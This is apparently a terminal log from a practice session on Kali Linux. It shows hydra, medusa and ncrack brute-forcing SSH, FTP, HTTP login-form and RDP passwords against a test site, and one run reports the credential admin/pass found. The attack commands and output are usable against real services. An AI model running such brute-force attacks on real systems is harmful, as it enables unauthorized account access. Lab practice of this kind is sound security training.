@@ -1,0 +1,87 @@
+┌──(crypl㉿kali)-[~/Desktop]
+└─$ hydra -l root -P pass.txt ssh://vulnweb.com
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-24 02:44:18
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task
+[DATA] attacking ssh://vulnweb.com:22/
+[ERROR] could not connect to ssh://44.228.249.3:22 - Connection refused
+
+┌──(crypl㉿kali)-[~/Desktop]
+└─$ hydra -l admin -P pass.txt ftp://vulnweb.com
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-24 02:46:32
+[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task
+[DATA] attacking ftp://vulnweb.com:21/
+[ERROR] all children were disabled due too many connection errors
+0 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-24 02:47:17
+                                                                                                                                                                                                                                           
+┌──(crypl㉿kali)-[~/Desktop]                                                                                                                                                                                                               
+└─$ hydra -l admin -P pass.txt vulnweb.com http-post-form      "/login:username=^USER^&password=^PASS^:F=incorrect"                                                                                                                        
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).                                                                                                                                                                                                                                                                       
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-24 02:47:49                                                                                                                                                         
+[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task                                                                                                                                                 
+[DATA] attacking http-post-form://vulnweb.com:80/login:username=^USER^&password=^PASS^:F=incorrect                                                                                                                                         
+1 of 1 target completed, 0 valid password found                                                                                                                                                                                            
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-24 02:47:51                                                                                                                                                         
+                                                                                                                                                                                                                                           
+┌──(crypl㉿kali)-[~/Desktop]                                                                                                                                                                                                               
+└─$ hydra -l admin -P pass.txt -t 8 ssh://vulnweb.com                                                                       
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-24 02:48:39
+[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task
+[DATA] attacking ssh://vulnweb.com:22/
+[ERROR] could not connect to ssh://44.228.249.3:22 - Connection refused
+
+┌──(crypl㉿kali)-[~/Desktop]
+└─$ medusa -h vulnweb.com -u root -P pass.txt -M ssh                                                                                                                                                                                       
+Medusa v2.3_rc1 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+ERROR: Hostname resolved to multiple addresses. Selecting first address for testing.
+ERROR: Thread 5553E6C0: Host: 44.228.249.3 Cannot connect [unreachable], retrying (1 of 3 retries)
+ERROR: Thread 5553E6C0: Host: 44.228.249.3 Cannot connect [unreachable], retrying (2 of 3 retries)
+ERROR: Thread 5553E6C0: Host: 44.228.249.3 Cannot connect [unreachable], retrying (3 of 3 retries)
+NOTICE: ssh.mod: failed to connect, port 22 was not open on 44.228.249.3
+
+┌──(crypl㉿kali)-[~/Desktop]
+└─$ medusa -h vulnweb.com -u admin -P pass.txt -M ftp                                                                                                                                                                                      
+Medusa v2.3_rc1 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+ERROR: Hostname resolved to multiple addresses. Selecting first address for testing.
+ERROR: Thread BA71E6C0: Host: 44.228.249.3 Cannot connect [unreachable], retrying (1 of 3 retries)
+ERROR: Thread BA71E6C0: Host: 44.228.249.3 Cannot connect [unreachable], retrying (2 of 3 retries)
+ERROR: Thread BA71E6C0: Host: 44.228.249.3 Cannot connect [unreachable], retrying (3 of 3 retries)
+NOTICE: ftp.mod: failed to connect, port 21 was not open on 44.228.249.3
+
+┌──(crypl㉿kali)-[~/Desktop]
+└─$ medusa -h vulnweb.com -u admin -P pass.txt -M http                                                                                                                                                                                     
+Medusa v2.3_rc1 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+ERROR: Hostname resolved to multiple addresses. Selecting first address for testing.
+2025-08-24 02:50:07 ACCOUNT CHECK: [http] Host: vulnweb.com (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: pass (1 of 3 complete)
+2025-08-24 02:50:07 ACCOUNT FOUND: [http] Host: vulnweb.com User: admin Password: pass [SUCCESS]
+
+┌──(crypl㉿kali)-[~/Desktop]
+└─$ medusa -H hostlist.txt -u admin -P pass.txt -M ssh                                                                                                                                                                                     
+Medusa v2.3_rc1 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+ERROR: Hostname resolved to multiple addresses. Selecting first address for testing.
+ERROR: Thread 2333E6C0: Host: 44.228.249.3 Cannot connect [unreachable], retrying (1 of 3 retries)
+ERROR: Thread 2333E6C0: Host: 44.228.249.3 Cannot connect [unreachable], retrying (2 of 3 retries)
+ERROR: Thread 2333E6C0: Host: 44.228.249.3 Cannot connect [unreachable], retrying (3 of 3 retries)
+NOTICE: ssh.mod: failed to connect, port 22 was not open on 44.228.249.3
+
+┌──(crypl㉿kali)-[~/Desktop]
+└─$ ncrack -p ssh -u root -P pass.txt vulnweb.com                                                                                                                                                                                      
+Starting Ncrack 0.7 ( http://ncrack.org ) at 2025-08-24 02:54 EDT
+Ncrack done: 1 service scanned in 6.35 seconds.
+Ncrack finished.
+
+┌──(crypl㉿kali)-[~/Desktop]
+└─$ ncrack -p rdp -u admin -P pass.txt vulnweb.com                                                                                                                                                                                         
+Starting Ncrack 0.7 ( http://ncrack.org ) at 2025-08-24 02:54 EDT
+Ncrack done: 1 service scanned in 6.05 seconds.
+Ncrack finished.
+
+┌──(crypl㉿kali)-[~/Desktop]
+└─$ ncrack -p ssh -u root -P pass.txt vulnweb.com
+Starting Ncrack 0.7 ( http://ncrack.org ) at 2025-08-24 02:55 EDT
+Ncrack done: 1 service scanned in 6.03 seconds.
+Ncrack finished
